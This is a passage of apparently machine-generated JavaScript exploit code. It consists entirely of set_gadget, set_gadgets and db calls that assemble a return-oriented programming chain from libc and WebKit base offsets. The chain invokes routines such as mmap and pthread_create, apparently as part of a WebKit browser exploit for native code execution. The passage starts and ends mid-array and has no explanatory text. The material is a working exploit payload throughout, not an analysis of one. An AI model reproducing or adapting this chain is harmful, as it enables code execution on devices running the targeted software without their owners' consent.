webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+154440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+154536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+154592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+154744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+154800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+154920, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([32, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+155008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+155168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+155136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155152, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+155264, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+155352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+155512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+155480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+155616, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+86472, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+155704, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+155792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+155952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+155920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+155936, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
jop_frame_addr,
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+156096, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([24, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+156184, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+156344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+156312, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156328, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+156440, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+156528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+156688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+156656, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156672, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+156792, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+158952, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+156928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+156944, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+156912, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+157064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157080, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+157048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+157176, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157192, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+157304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157288, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+157392, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+157376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+157488, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157504, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+157616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+157600, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
mmap_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+158944, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
pthread_create_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+160272, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+160344, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+160448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+160432, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+160600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+160616, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+160584, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+160712, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+160728, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+160840, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+160824, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+160928, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+160912, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+161024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+161040, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+161152, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+161136, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+161224, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+161328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+161312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+161456, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+161440, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+161592, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+161576, 
webkit_base+7438103, 
libc_base+206806, 
ropchain+136, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+161744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+161776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+161728, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+161760, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+161848, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+161864, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+161984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+162000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+161968, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+8824269, 
libc_base+269973, 
libc_base+793877, 
ropchain+162168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+162184, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+162152, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+162288, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+162336, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+162320, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+162448, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+162440, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+162464, 
ropchain+163288, 
libc_base+50775, 
libc_base+793877, 
ropchain+162504, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+162632, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+162616, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+162728, 
webkit_base+7438103, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+162872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+162856, 
webkit_base+7438103, 
libc_base+206806, 
ropchain+136, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+163024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+163056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+163008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+163040, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+163152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+163136, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+163256, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+165672, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+163344, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+163432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+163448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+163608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+163576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+163560, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+163664, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+163768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+163800, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+163784, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+163960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+163928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+163912, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+164016, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+164120, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+164152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+164136, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+164224, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+164240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
